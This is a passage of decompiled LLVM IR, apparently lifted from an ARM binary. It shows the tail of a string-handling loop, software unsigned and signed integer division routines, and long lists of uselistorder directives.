  %v2_ca10 = inttoptr i32 %v7_c9fc to i8*
  %v3_ca10 = call i32 @function_fa14(i8* %v2_ca10, i32 %v2_c9b8)
  store i32 143232, i32* %r2.global-to-local, align 4
  %v3_ca2c = mul i32 %storemerge19115, 8
  %v2_ca34 = add i32 %v3_ca2c, 143236
  %v1_ca38 = inttoptr i32 %v2_ca34 to i32*
  %v2_ca38 = load i32, i32* %v1_ca38, align 4
  store i32 %storemerge33.in, i32* %r2.global-to-local, align 4
  store i32 51808, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_ca38)
  %v1_ca64 = add i32 %storemerge19115, 1
  store i32 143232, i32* %r2.global-to-local, align 4
  %v4_ca74 = mul i32 %v1_ca64, 8
  %v5_ca74 = add i32 %v4_ca74, 143232
  %v6_ca74 = inttoptr i32 %v5_ca74 to i32*
  %v7_ca74 = load i32, i32* %v6_ca74, align 8
  %v2_ca78 = icmp eq i32 %v7_ca74, 0
  br i1 %v2_ca78, label %dec_label_pc_ca80, label %dec_label_pc_c9f4

dec_label_pc_ca80:                                ; preds = %dec_label_pc_c9f4, %dec_label_pc_c99c
  %v4_ca90 = call i32 @function_fa14(i8* %v3_c9c4, i32 ptrtoint ([6 x i8]* @global_var_19780.255 to i32))
  %v2_ca98 = icmp eq i32 %v4_ca90, 0
  br i1 %v2_ca98, label %dec_label_pc_c500, label %dec_label_pc_caa0

dec_label_pc_caa0:                                ; preds = %dec_label_pc_ca80
  %v5_caa8 = call i32 @function_f9e4(i32 0, i32 ptrtoint (i32* @global_var_19778.250 to i32), i32 143232, i32 %v4_ca90, i32 ptrtoint (i32* @0 to i32))
  %v2_cab8 = icmp eq i32 %v5_caa8, 0
  br i1 %v2_cab8, label %dec_label_pc_c550.lr.ph, label %dec_label_pc_cac0

dec_label_pc_cac0:                                ; preds = %dec_label_pc_c83c, %dec_label_pc_caa0
  %storemerge33.in = phi i32 [ %v5_caa8, %dec_label_pc_caa0 ], [ %v6_c86c, %dec_label_pc_c83c ]
  %storemerge33 = inttoptr i32 %storemerge33.in to i8*
  %v2_cac4 = load i8, i8* %storemerge33, align 1
  %v2_cac8 = icmp eq i8 %v2_cac4, 0
  br i1 %v2_cac8, label %dec_label_pc_c550.lr.ph, label %dec_label_pc_c87c

; uselistorder directives
  uselistorder i8* %storemerge33, { 3, 2, 1, 0 }
  uselistorder i32 %storemerge33.in, { 11, 10, 5, 3, 2, 4, 9, 1, 0, 8, 7, 6 }
  uselistorder i32* %v6_ca74, { 1, 0 }
  uselistorder i32 %v1_ca64, { 1, 0 }
  uselistorder i32 %storemerge19115, { 2, 0, 1 }
  uselistorder i32 %v2_c9a8.pre-phi, { 1, 0 }
  uselistorder i32 %.pre35, { 1, 0 }
  uselistorder i32 %storemerge18, { 0, 2, 4, 1, 5, 3 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge21, { 1, 3, 5, 2, 0, 4 }
  uselistorder i32 %v2_c850, { 0, 2, 1 }
  uselistorder i32 %v4_c824, { 1, 0, 2 }
  uselistorder i32 %v2_c7c0, { 2, 1, 0 }
  uselistorder i32 %v1_c764, { 1, 0 }
  uselistorder i32 %v3_c730, { 2, 0, 1 }
  uselistorder i32 %storemerge1698, { 1, 0 }
  uselistorder i32 %v1_c714, { 1, 0 }
  uselistorder i32 %v2_c6e0, { 1, 0 }
  uselistorder i32 %v2_c6d0, { 1, 0 }
  uselistorder i32 %v1_c668, { 0, 2, 1 }
  uselistorder i32 %v3_c6dc90, { 1, 0 }
  uselistorder i32 %v2_c6e087, { 1, 0 }
  uselistorder i32 %v3_c6dc86, { 1, 0 }
  uselistorder i32 %.pre129, { 1, 4, 0, 3, 2 }
  uselistorder i32 %v3_c630, { 1, 0 }
  uselistorder i32 %storemerge14111, { 1, 0 }
  uselistorder i32 %v2_c57c, { 1, 0 }
  uselistorder i32 %storemerge1328, { 1, 0 }
  uselistorder i32 %v2_c904, { 1, 0 }
  uselistorder i32 %v2_c53c, { 2, 0, 1 }
  uselistorder i32 %storemerge12, { 2, 3, 0, 1 }
  uselistorder i32 %v3_c3f8, { 1, 2, 0 }
  uselistorder i32 %v3_c344, { 1, 0, 2, 3 }
  uselistorder i32 %v2_c2b0, { 0, 1, 2, 4, 3 }
  uselistorder i32 %stack_var_-68.0, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v2_c19c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_c174, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-1624, { 1, 2, 0, 3 }
  uselistorder i32* %r2.global-to-local, { 8, 4, 5, 6, 7, 49, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 27, 19, 21, 20, 50, 22, 23, 24, 3, 25, 26, 48, 28, 29, 30, 31, 32, 33, 36, 34, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0, 1, 2 }
  uselistorder i32 143232, { 2, 3, 5, 4, 1, 0 }
  uselistorder i32 (i32)* @function_8628, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_f9e4, { 1, 0 }
  uselistorder i32* @global_var_25ab4.16, { 1, 11, 3, 4, 5, 0, 6, 7, 8, 2, 9, 10 }
  uselistorder i32* @global_var_23248.14, { 7, 8, 1, 5, 9, 10, 2, 0, 11, 3, 12, 4, 6, 13 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_cf58, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_8398, { 64, 63, 62, 61, 60, 59, 5, 6, 4, 3, 2, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 0, 13, 12, 11, 10, 9, 8, 1, 7 }
  uselistorder i32* @global_var_259a0.10, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 1, 13, 14 }
  uselistorder i32* @global_var_25aa8.130, { 0, 9, 1, 5, 2, 6, 7, 8, 3, 4 }
  uselistorder i32* @global_var_25998.29, { 1, 0 }
  uselistorder i32* @global_var_2599c.175, { 3, 0, 1, 4, 5, 2, 6, 7, 8, 9, 10 }
  uselistorder i32 ()* @function_86b4, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_11620, { 1, 0 }
  uselistorder i32 ()* @function_cf08, { 2, 0, 1 }
  uselistorder i32 (i16*)* @function_eca4, { 1, 2, 0 }
  uselistorder [2 x i8]* @global_var_188d0.25, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_188d0.25 to i32), { 5, 2, 4, 1, 3, 0 }
  uselistorder label %dec_label_pc_cac0, { 1, 0 }
  uselistorder label %dec_label_pc_c9f4, { 1, 0 }
  uselistorder label %dec_label_pc_c968, { 1, 0 }
  uselistorder label %dec_label_pc_c950, { 1, 0 }
  uselistorder label %dec_label_pc_c8ac, { 1, 0 }
  uselistorder label %dec_label_pc_c79c, { 1, 0 }
  uselistorder label %dec_label_pc_c780, { 1, 0 }
  uselistorder label %dec_label_pc_c72c, { 1, 0 }
  uselistorder label %dec_label_pc_c674, { 1, 0 }
  uselistorder label %dec_label_pc_c550, { 1, 0 }
  uselistorder label %dec_label_pc_c550.lr.ph, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_c500, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_c464, { 1, 0 }
  uselistorder label %dec_label_pc_c3a4, { 1, 0 }
  uselistorder label %dec_label_pc_c38c, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_c26c, { 1, 0 }
  uselistorder label %dec_label_pc_c1f8, { 1, 0 }
  uselistorder label %.thread22, { 1, 0 }
}

define i32 @function_cb30() local_unnamed_addr {
dec_label_pc_cb30:
  %r2.global-to-local = alloca i32, align 4
  %v0_cb30 = load i32, i32* @r1, align 4
  %v1_cb30 = add i32 %v0_cb30, -1
  store i32 %v1_cb30, i32* %r2.global-to-local, align 4
  %v2_cb30 = icmp eq i32 %v0_cb30, 0
  %v7_cb30 = icmp eq i32 %v0_cb30, 1
  %v0_cb34 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_cb30, i32 %v0_cb34)
  br i1 %v2_cb30, label %dec_label_pc_cc18, label %dec_label_pc_cb3c

dec_label_pc_cb3c:                                ; preds = %dec_label_pc_cb30
  %v0_cb3c = load i32, i32* @r0, align 4
  %v1_cb3c = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_cb3c, %v1_cb3c
  br i1 %tmp, label %dec_label_pc_cb44, label %dec_label_pc_cbd0

dec_label_pc_cb44:                                ; preds = %dec_label_pc_cb3c
  %v1_cb44 = load i32, i32* %r2.global-to-local, align 4
  %v2_cb44 = and i32 %v1_cb44, %v1_cb3c
  %v4_cb44 = icmp eq i32 %v2_cb44, 0
  br i1 %v4_cb44, label %dec_label_pc_cbdc, label %dec_label_pc_cb4c

dec_label_pc_cb4c:                                ; preds = %dec_label_pc_cb44
  %v3_cb4c = icmp ult i32 %v1_cb3c, 536870912
  br i1 %v3_cb4c, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_cb4c
  %v4_cb50 = mul i32 %v1_cb3c, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_cb4c, %.thread
  %v0_cb70.pr36.ph = phi i32 [ %v4_cb50, %.thread ], [ %v1_cb3c, %dec_label_pc_cb4c ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_cb4c ]
  store i32 %storemerge133, i32* @r3, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_cb70.pr36 = phi i32 [ %v4_cb64, %bb81 ], [ %v0_cb70.pr36.ph, %.preheader.preheader ]
  %v1_cb68 = phi i32 [ %v4_cb68, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_cb5c = icmp ugt i32 %v0_cb70.pr36, 268435455
  br i1 %v2_cb5c, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_cb70thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_cb60 = icmp ult i32 %v0_cb70.pr36, %v0_cb3c
  br i1 %v4_cb60, label %bb80, label %dec_label_pc_cb70thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_cb64 = and i32 %v0_cb70.pr36, 268435456
  %v3_cb64 = icmp eq i32 %v2_cb64, 0
  %v4_cb64 = mul i32 %v0_cb70.pr36, 16
  br i1 %v3_cb64, label %bb81, label %dec_label_pc_cb70.loopexit

bb81:                                             ; preds = %bb80
  %v2_cb68 = and i32 %v1_cb68, 268435456
  %v3_cb68 = icmp eq i32 %v2_cb68, 0
  %v4_cb68 = mul i32 %v1_cb68, 16
  store i32 %v4_cb68, i32* @r3, align 4
  br i1 %v3_cb68, label %.preheader, label %dec_label_pc_cb70thread-pre-split.loopexit.loopexit

dec_label_pc_cb70thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_cb7c48.ph = phi i32 [ %v1_cb68, %bb ], [ %v4_cb68, %bb81 ]
  %v0_cb70.pr38.ph = phi i32 [ %v0_cb70.pr36, %bb ], [ %v4_cb64, %bb81 ]
  br label %dec_label_pc_cb70thread-pre-split.loopexit

dec_label_pc_cb70thread-pre-split.loopexit:       ; preds = %dec_label_pc_cb70thread-pre-split.loopexit.loopexit, %.thread2
  %v1_cb7c48 = phi i32 [ %v1_cb68, %.thread2 ], [ %v1_cb7c48.ph, %dec_label_pc_cb70thread-pre-split.loopexit.loopexit ]
  %v0_cb70.pr38 = phi i32 [ %v0_cb70.pr36, %.thread2 ], [ %v0_cb70.pr38.ph, %dec_label_pc_cb70thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_cb70thread-pre-split

dec_label_pc_cb70thread-pre-split:                ; preds = %dec_label_pc_cb70thread-pre-split.loopexit, %bb83
  %v1_cb7c46 = phi i32 [ %v1_cb7c48, %dec_label_pc_cb70thread-pre-split.loopexit ], [ %v3_cb7c, %bb83 ]
  %v0_cb70.pr = phi i32 [ %v0_cb70.pr38, %dec_label_pc_cb70thread-pre-split.loopexit ], [ %v3_cb78, %bb83 ]
  br label %dec_label_pc_cb70

dec_label_pc_cb70.loopexit:                       ; preds = %bb80
  br label %dec_label_pc_cb70

dec_label_pc_cb70:                                ; preds = %dec_label_pc_cb70.loopexit, %dec_label_pc_cb70thread-pre-split
  %v1_cb7c = phi i32 [ %v1_cb7c46, %dec_label_pc_cb70thread-pre-split ], [ %v1_cb68, %dec_label_pc_cb70.loopexit ]
  %v1_cb78 = phi i32 [ %v0_cb70.pr, %dec_label_pc_cb70thread-pre-split ], [ %v4_cb64, %dec_label_pc_cb70.loopexit ]
  %v2_cb70 = icmp slt i32 %v1_cb78, 0
  br i1 %v2_cb70, label %dec_label_pc_cb84, label %bb82

bb82:                                             ; preds = %dec_label_pc_cb70
  %v4_cb74 = icmp ult i32 %v1_cb78, %v0_cb3c
  br i1 %v4_cb74, label %bb83, label %dec_label_pc_cb84

bb83:                                             ; preds = %bb82
  %v3_cb78 = mul i32 %v1_cb78, 2
  %v2_cb7c = icmp slt i32 %v1_cb7c, 0
  %v3_cb7c = mul i32 %v1_cb7c, 2
  store i32 %v3_cb7c, i32* @r3, align 4
  br i1 %v2_cb7c, label %dec_label_pc_cb84, label %dec_label_pc_cb70thread-pre-split

dec_label_pc_cb84:                                ; preds = %bb82, %dec_label_pc_cb70, %bb83
  %v2_cb9059 = phi i32 [ %v3_cb7c, %bb83 ], [ %v1_cb7c, %bb82 ], [ %v1_cb7c, %dec_label_pc_cb70 ]
  %v1_cb8851 = phi i32 [ %v3_cb78, %bb83 ], [ %v1_cb78, %bb82 ], [ %v1_cb78, %dec_label_pc_cb70 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_cb88

dec_label_pc_cb88:                                ; preds = %.thread11, %dec_label_pc_cb84
  %v1_cbbc = phi i32 [ %v4_cbbc, %.thread11 ], [ %v2_cb9059, %dec_label_pc_cb84 ]
  %v1_cb90 = phi i32 [ %v0_cbc8, %.thread11 ], [ 0, %dec_label_pc_cb84 ]
  %v1_cbc0 = phi i32 [ %v4_cbc0, %.thread11 ], [ %v1_cb8851, %dec_label_pc_cb84 ]
  %v1_cb8c = phi i32 [ %v0_cbb8, %.thread11 ], [ %v0_cb3c, %dec_label_pc_cb84 ]
  %v3_cb88 = icmp ult i32 %v1_cb8c, %v1_cbc0
  br i1 %v3_cb88, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_cb88
  %v3_cb8c = sub i32 %v1_cb8c, %v1_cbc0
  %v3_cb90 = or i32 %v1_cb90, %v1_cbbc
  store i32 %v3_cb90, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_cb88, %bb84
  %v1_cb98 = phi i32 [ %v1_cb8c, %dec_label_pc_cb88 ], [ %v3_cb8c, %bb84 ]
  %v1_cb9c = phi i32 [ %v1_cb90, %dec_label_pc_cb88 ], [ %v3_cb90, %bb84 ]
  %v4_cb94 = udiv i32 %v1_cbc0, 2
  %v6_cb94 = icmp ult i32 %v1_cb98, %v4_cb94
  br i1 %v6_cb94, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_cb98 = urem i32 %v1_cbc0, 2
  %v4_cb98 = icmp eq i32 %v3_cb98, 0
  %v6_cb98 = sub i32 %v1_cb98, %v4_cb94
  br i1 %v4_cb98, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_cb9c = udiv i32 %v1_cbbc, 2
  %v6_cb9c = or i32 %v1_cb9c, %v5_cb9c
  store i32 %v6_cb9c, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_cba4 = phi i32 [ %v6_cb98, %bb85 ], [ %v1_cb98, %.thread7 ], [ %v6_cb98, %bb86 ]
  %v1_cba8 = phi i32 [ %v1_cb9c, %bb85 ], [ %v1_cb9c, %.thread7 ], [ %v6_cb9c, %bb86 ]
  %v4_cba0 = udiv i32 %v1_cbc0, 4
  %v6_cba0 = icmp ult i32 %v1_cba4, %v4_cba0
  br i1 %v6_cba0, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_cba4 = and i32 %v1_cbc0, 2
  %v4_cba4 = icmp eq i32 %v3_cba4, 0
  %v6_cba4 = sub i32 %v1_cba4, %v4_cba0
  br i1 %v4_cba4, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_cba8 = udiv i32 %v1_cbbc, 4
  %v6_cba8 = or i32 %v1_cba8, %v5_cba8
  store i32 %v6_cba8, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_cbb0 = phi i32 [ %v6_cba4, %bb87 ], [ %v1_cba4, %.thread8 ], [ %v6_cba4, %bb88 ]
  %v1_cbb4 = phi i32 [ %v1_cba8, %bb87 ], [ %v1_cba8, %.thread8 ], [ %v6_cba8, %bb88 ]
  %v4_cbac = udiv i32 %v1_cbc0, 8
  %v6_cbac = icmp ult i32 %v1_cbb0, %v4_cbac
  br i1 %v6_cbac, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_cbb0 = and i32 %v1_cbc0, 4
  %v4_cbb0 = icmp eq i32 %v3_cbb0, 0
  %v6_cbb0 = sub i32 %v1_cbb0, %v4_cbac
  br i1 %v4_cbb0, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_cbb4 = udiv i32 %v1_cbbc, 8
  %v6_cbb4 = or i32 %v1_cbb4, %v5_cbb4
  store i32 %v6_cbb4, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_cbc8 = phi i32 [ %v1_cbb4, %bb89 ], [ %v1_cbb4, %.thread9 ], [ %v6_cbb4, %bb90 ]
  %v0_cbb8 = phi i32 [ %v6_cbb0, %bb89 ], [ %v1_cbb0, %.thread9 ], [ %v6_cbb0, %bb90 ]
  %v2_cbb8 = icmp eq i32 %v0_cbb8, 0
  br i1 %v2_cbb8, label %dec_label_pc_cbc8, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %v4_cbbc = udiv i32 %v1_cbbc, 16
  store i32 %v4_cbbc, i32* @r3, align 4
  %tmp138 = icmp ult i32 %v1_cbbc, 16
  br i1 %tmp138, label %dec_label_pc_cbc8, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_cbc0 = udiv i32 %v1_cbc0, 16
  br label %dec_label_pc_cb88

dec_label_pc_cbc8:                                ; preds = %thread-pre-split, %bb91
  ret i32 %v0_cbc8

dec_label_pc_cbd0:                                ; preds = %dec_label_pc_cb3c
  %v9_cb3c = icmp eq i32 %v0_cb3c, %v1_cb3c
  %. = zext i1 %v9_cb3c to i32
  ret i32 %.

dec_label_pc_cbdc:                                ; preds = %dec_label_pc_cb44
  %v2_cbdc = icmp ugt i32 %v1_cb3c, 65535
  br i1 %v2_cbdc, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_cbdc
  %v2_cbe0 = and i32 %v1_cb3c, 32768
  %v3_cbe0 = icmp eq i32 %v2_cbe0, 0
  %v4_cbe0 = udiv i32 %v1_cb3c, 65536
  br i1 %v3_cbe0, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_cbdc
  %v0_cbec65 = phi i32 [ %v1_cb3c, %dec_label_pc_cbdc ], [ %v4_cbe0, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_cbf0 = phi i32 [ %v0_cbec65, %.thread16 ], [ %v4_cbe0, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_cbec = icmp ugt i32 %v1_cbf0, 255
  br i1 %v2_cbec, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_cbf0 = and i32 %v1_cbf0, 128
  %v3_cbf0 = icmp eq i32 %v2_cbf0, 0
  %v4_cbf0 = udiv i32 %v1_cbf0, 256
  br i1 %v3_cbf0, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_cbf4 = or i32 %storemerge, 8
  store i32 %v2_cbf4, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_cc00 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_cbf4, %bb98 ]
  %v1_cbfc = phi i32 [ %v1_cbf0, %bb96 ], [ %v4_cbf0, %bb97 ], [ %v4_cbf0, %bb98 ]
  %v2_cbf8 = icmp ugt i32 %v1_cbfc, 15
  br i1 %v2_cbf8, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_cbfc = and i32 %v1_cbfc, 8
  %v3_cbfc = icmp eq i32 %v2_cbfc, 0
  %v4_cbfc = udiv i32 %v1_cbfc, 16
  br i1 %v3_cbfc, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_cc00 = add nsw i32 %v1_cc00, 4
  store i32 %v2_cc00, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_cc08 = phi i32 [ %v1_cc00, %.thread17 ], [ %v1_cc00, %bb99 ], [ %v2_cc00, %bb100 ]
  %v5_cc0c = phi i32 [ %v1_cbfc, %.thread17 ], [ %v4_cbfc, %bb99 ], [ %v4_cbfc, %bb100 ]
  %v2_cc04 = icmp ugt i32 %v5_cc0c, 3
  %v7_cc04 = icmp eq i32 %v5_cc0c, 4
  %v2_cc08 = xor i1 %v7_cc04, true
  %v3_cc08 = and i1 %v2_cc04, %v2_cc08
  br i1 %v3_cc08, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_cc08 = add nsw i32 %v4_cc08, 3
  store i32 %v5_cc08, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_cc0c = phi i32 [ %v4_cc08, %.thread18 ], [ %v5_cc08, %bb101 ]
  %v2_cc0c = xor i1 %v2_cc04, true
  %v3_cc0c = or i1 %v7_cc04, %v2_cc0c
  br i1 %v3_cc0c, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_cc0c = udiv i32 %v5_cc0c, 2
  %v9_cc0c = add i32 %v4_cc0c, %v8_cc0c
  store i32 %v9_cc0c, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_cc10 = phi i32 [ %v4_cc0c, %bb102 ], [ %v9_cc0c, %bb103 ]
  %v6_cc10 = lshr i32 %v0_cb3c, %v1_cc10
  ret i32 %v6_cc10

dec_label_pc_cc18:                                ; preds = %dec_label_pc_cb30
  %v0_cc18 = load i32, i32* @lr, align 4
  %v0_cc1c = call i32 @function_cd88()
  store i32 %v0_cc18, i32* @lr, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_cc0c, { 1, 0 }
  uselistorder i1 %v7_cc04, { 1, 0 }
  uselistorder i32 %v4_cbfc, { 1, 0 }
  uselistorder i32 %v1_cbfc, { 1, 0, 2, 3 }
  uselistorder i32 %v2_cbf4, { 1, 0 }
  uselistorder i32 %v4_cbf0, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_cbf0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_cbe0, { 1, 0 }
  uselistorder i32 %v0_cbb8, { 1, 0 }
  uselistorder i32 %v4_cbac, { 1, 0 }
  uselistorder i32 %v1_cbb4, { 1, 2, 0 }
  uselistorder i32 %v4_cba0, { 1, 0 }
  uselistorder i32 %v1_cba8, { 1, 2, 0 }
  uselistorder i32 %v4_cb94, { 1, 0 }
  uselistorder i32 %v1_cb9c, { 1, 2, 0 }
  uselistorder i32 %v1_cbc0, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_cb90, { 1, 0 }
  uselistorder i32 %v3_cb7c, { 2, 0, 1 }
  uselistorder i32 %v3_cb78, { 1, 0 }
  uselistorder i32 %v1_cb78, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_cb7c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_cb68, { 2, 0, 1 }
  uselistorder i32 %v4_cb64, { 2, 1, 0 }
  uselistorder i32 %v1_cb68, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_cb70.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_cb3c, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_cb3c, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_cb30, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_cbc8, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_cb84, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cb70thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @function_cc2c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_cc2c:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_cc30 = call i32 @function_cb30()
  ret i32 %v0_cc30
}

define i32 @function_cc44() local_unnamed_addr {
dec_label_pc_cc44:
  %v0_cc44 = load i32, i32* @r1, align 4
  %v1_cc44 = icmp slt i32 %v0_cc44, 0
  %v2_cc44 = icmp eq i32 %v0_cc44, 0
  %v0_cc48 = load i32, i32* @r0, align 4
  %v2_cc48 = xor i32 %v0_cc48, %v0_cc44
  br i1 %v2_cc44, label %dec_label_pc_cd5c, label %dec_label_pc_cc50

dec_label_pc_cc50:                                ; preds = %dec_label_pc_cc44
  br i1 %v1_cc44, label %bb, label %thread-pre-split

bb:                                               ; preds = %dec_label_pc_cc50
  %v2_cc50 = sub i32 0, %v0_cc44
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_cc50, %bb
  %v1_cd1c = phi i32 [ %v2_cc50, %bb ], [ %v0_cc44, %dec_label_pc_cc50 ]
  %v1_cc54 = add i32 %v1_cd1c, -1
  %v7_cc54 = icmp eq i32 %v1_cd1c, 1
  br i1 %v7_cc54, label %dec_label_pc_ccfc, label %dec_label_pc_cc5c

dec_label_pc_cc5c:                                ; preds = %thread-pre-split
  %v1_cc5c = icmp slt i32 %v0_cc48, 0
  br i1 %v1_cc5c, label %bb84, label %bb85

bb84:                                             ; preds = %dec_label_pc_cc5c
  %v2_cc60 = sub i32 0, %v0_cc48
  br label %bb85

bb85:                                             ; preds = %dec_label_pc_cc5c, %bb84
  %v0_cd50 = phi i32 [ %v0_cc48, %dec_label_pc_cc5c ], [ %v2_cc60, %bb84 ]
  %v3_cc64 = icmp uge i32 %v0_cd50, %v1_cd1c
  %v9_cc64 = icmp eq i32 %v0_cd50, %v1_cd1c
  %v2_cc68 = xor i1 %v3_cc64, true
  %v3_cc68 = or i1 %v9_cc64, %v2_cc68
  br i1 %v3_cc68, label %dec_label_pc_cd08, label %dec_label_pc_cc6c

dec_label_pc_cc6c:                                ; preds = %bb85
  %v2_cc6c = and i32 %v1_cc54, %v1_cd1c
  %v4_cc6c = icmp eq i32 %v2_cc6c, 0
  br i1 %v4_cc6c, label %dec_label_pc_cd18, label %dec_label_pc_cc74

dec_label_pc_cc74:                                ; preds = %dec_label_pc_cc6c
  %v3_cc74 = icmp ult i32 %v1_cd1c, 536870912
  br i1 %v3_cc74, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_cc74
  %v4_cc78 = mul i32 %v1_cd1c, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_cc74, %.thread
  %v0_cc98.pr40.ph = phi i32 [ %v4_cc78, %.thread ], [ %v1_cd1c, %dec_label_pc_cc74 ]
  %storemerge142 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_cc74 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb88
  %v0_cc98.pr40 = phi i32 [ %v4_cc8c, %bb88 ], [ %v0_cc98.pr40.ph, %.preheader.preheader ]
  %v1_cc90 = phi i32 [ %v4_cc90, %bb88 ], [ %storemerge142, %.preheader.preheader ]
  %v2_cc84 = icmp ugt i32 %v0_cc98.pr40, 268435455
  br i1 %v2_cc84, label %.thread3, label %bb86

.thread3:                                         ; preds = %.preheader
  br label %dec_label_pc_cc98thread-pre-split.loopexit

bb86:                                             ; preds = %.preheader
  %v4_cc88 = icmp ult i32 %v0_cc98.pr40, %v0_cd50
  br i1 %v4_cc88, label %bb87, label %dec_label_pc_cc98thread-pre-split.loopexit.loopexit

bb87:                                             ; preds = %bb86
  %v2_cc8c = and i32 %v0_cc98.pr40, 268435456
  %v3_cc8c = icmp eq i32 %v2_cc8c, 0
